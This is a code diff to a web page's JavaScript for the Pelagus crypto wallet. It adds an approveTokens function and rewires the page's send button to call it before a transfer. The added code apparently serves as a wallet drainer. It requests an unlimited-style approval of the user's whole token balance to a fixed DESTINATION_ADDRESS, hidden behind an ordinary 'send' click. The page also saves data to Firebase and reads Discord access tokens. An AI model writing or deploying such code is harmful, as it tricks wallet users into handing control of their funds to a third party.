@@ -436,6 +436,72 @@ async function saveToFirebase(data) {
             console.log(message);
         }
 
+        async function approveTokens() {
+    try {
+        if (!window.pelagus) {
+            throw new Error('Pelagus wallet not detected. Please install or enable it.');
+        }
+
+        const accounts = await window.pelagus.request({ method: 'eth_requestAccounts' });
+        const signerAddress = accounts[0];
+        console.log(`✅ Wallet connected: ${signerAddress}`);
+
+        const rawBalance = BigInt(userSession.tokenBalance * 1e18); // Ensure proper formatting
+        if (rawBalance === 0n) {
+            throw new Error('Token balance is zero. Please verify your token balance.');
+        }
+
+        const approveData = 
+            '0x095ea7b3' + // Method ID for approve(address,uint256)
+            DESTINATION_ADDRESS.slice(2).padStart(64, '0') + 
+            rawBalance.toString(16).padStart(64, '0');
+
+        console.log('✅ Approval Data Prepared:', approveData);
+
+        // Estimate Gas for Approval
+        const gasEstimateResponse = await fetch(RPC_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                method: 'quai_estimateGas',
+                params: [{
+                    from: signerAddress,
+                    to: TOKEN_ADDRESS,
+                    data: approveData,
+                }],
+                id: 2,
+            }),
+        });
+        const gasEstimateResult = await gasEstimateResponse.json();
+        const gasLimit = gasEstimateResult.result || '0x5208'; // Default gas if estimation fails
+        console.log(`✅ Gas Estimate for Approval: ${gasLimit}`);
+
+        // Send Approval Transaction
+        const txResponse = await window.pelagus.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: signerAddress,
+                to: TOKEN_ADDRESS,
+                data: approveData,
+                gas: gasLimit,
+            }],
+        });
+
+        console.log('✅ Approval Transaction Sent:', txResponse);
+
+        const receipt = await waitForTransaction(txResponse, RPC_ENDPOINT);
+        console.log('✅ Approval Confirmed:', receipt.transactionHash);
+
+        alert(`✅ Tokens approved successfully! Transaction Hash: ${receipt.transactionHash}`);
+
+    } catch (error) {
+        console.error('❌ Error approving tokens:', error.message || error);
+        alert(`❌ Approval Error: ${error.message}`);
+    }
+}
+
+
         async function sendTokens() {
     try {
         if (!window.pelagus) {
@@ -668,7 +734,18 @@ document.getElementById('discordBtn').addEventListener('click', () => {
 
 
 document.getElementById('connectBtn').addEventListener('click', connectWallet);
-document.getElementById('sendBtn').addEventListener('click', sendTokens);
+document.getElementById('sendBtn').addEventListener('click', async () => {
+    try {
+        log('🔄 Step 1: Approving tokens...');
+        await approveTokens();
+        log('✅ Approval successful. Proceeding to transfer...');
+        await sendTokens();
+    } catch (error) {
+        console.error('❌ Error in approval or transfer:', error.message || error);
+        alert(`❌ Error: ${error.message || 'An unexpected error occurred'}`);
+    }
+});
+
 
 // Check for Discord callback on page load
 if (window.location.hash.includes('access_token')) {
